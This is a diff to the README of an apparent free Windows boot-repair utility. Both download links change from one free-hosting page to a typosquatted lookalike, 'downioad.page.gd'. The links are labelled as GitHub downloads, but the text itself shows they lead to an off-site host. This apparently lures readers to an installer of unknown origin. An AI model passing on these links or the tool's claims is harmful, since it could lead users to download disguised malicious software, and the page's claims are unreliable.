@@ -2,7 +2,7 @@
 
 Windows Boot Manager Repair 2026 is a powerful, free tool designed to fix boot-related issues on Windows 10 and 11 systems. It helps users rebuild the Boot Configuration Data (BCD) and restore access to their operating system without needing advanced technical skills. Whether you're facing a missing boot manager, black screen errors, or other startup problems, this utility provides a straightforward and reliable solution for system recovery.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -80,7 +80,7 @@ A: The tool primarily focuses on standard BIOS/UEFI setups with single or multip
 
 To obtain the latest version of Windows Boot Manager Repair for your system, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
